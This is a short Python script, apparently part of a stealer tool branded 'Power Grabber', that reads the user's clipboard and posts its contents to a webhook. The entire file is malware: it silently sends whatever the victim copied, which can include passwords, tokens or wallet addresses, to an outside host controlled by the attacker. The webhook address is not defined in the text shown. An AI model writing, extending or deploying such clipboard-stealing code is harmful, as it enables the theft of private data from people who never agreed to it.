import pyperclip
import requests
import json
def send_to_webhook(content):
    embed = {
        "description": content,
        "color": 0x8B0000,
        "footer": {
            "text": f"Power Grabber | Made by Powercascade and Taktikal.exe"
        }
    }

    payload = {
        "embeds": [embed]
    }
    headers = {
        "Content-Type": "application/json"
    }
    requests.post(webhook_url, data=json.dumps(payload), headers=headers)
clipboard_content = pyperclip.paste()
send_to_webhook(clipboard_content)
